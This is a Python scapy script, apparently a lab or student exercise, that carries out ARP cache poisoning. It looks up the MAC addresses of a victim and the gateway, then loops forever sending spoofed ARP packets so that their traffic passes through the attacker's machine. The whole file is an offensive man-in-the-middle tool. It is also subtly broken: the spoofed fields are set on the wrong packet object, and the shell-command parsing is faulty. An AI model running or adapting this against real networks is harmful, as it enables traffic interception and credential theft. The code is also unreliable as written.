from scapy.all import *

file = open("vIP.txt")
vIP = file.read()
file.close()

#KAN waarschijn weg
def ip_to_mac(IP, retry= 2, timeout=2):
       
    #create inital ARP packet to send
    arp = ARP()
    arp.op = 1
    arp.hwdst = 'ff:ff:ff:ff:ff:ff'
    arp.pdst = IP

    response, unanswered = sr(arp, retry=retry, timeout=timeout)

    for s,r in response:
    # If there is a repsonse return the mac address related to the given IP
        return r[ARP].underlayer.src
    
    # If no reponse then return nothing
    return None

#Get the mac address of the victim, mac of the attacker, 
vMAC = ip_to_mac(vIP);
macAttacker = subprocess.check_output("cat /sys/class/net/enp0s3/address", shell = True)
#vMAC = subprocess.check_output("arp -a " + vIP + " | awk '{print $4}' ", shell = True)
gatewayIP = subprocess.check_output("route -n | awk '$1 == \"0.0.0.0\" {print $2}' ", shell = True)
gatewayMac = subprocess.check_output("arp -n | awk '$1 == " + gatewayIP + "  {print $3}'", shell = True)

#Create arp packet for victim
arpVictim = Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker
arp[ARP].psrc = gatewayIP
arp[ARP].hwdst = vMAC
arp[ARP].pdst = vIP

#Create arp packet for Gateway
arpGateway = Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker
arp[ARP].psrc = vIP
arp[ARP].hwdst = gatewayMac
arp[ARP].pdst = gatewayIP


def arpPoison():
    sendp(arpVictim, iface="enp0s3")
    sendp(arpGateway, iface="enp0s3")
    time.sleep(1)

while True:
    arpPoison()
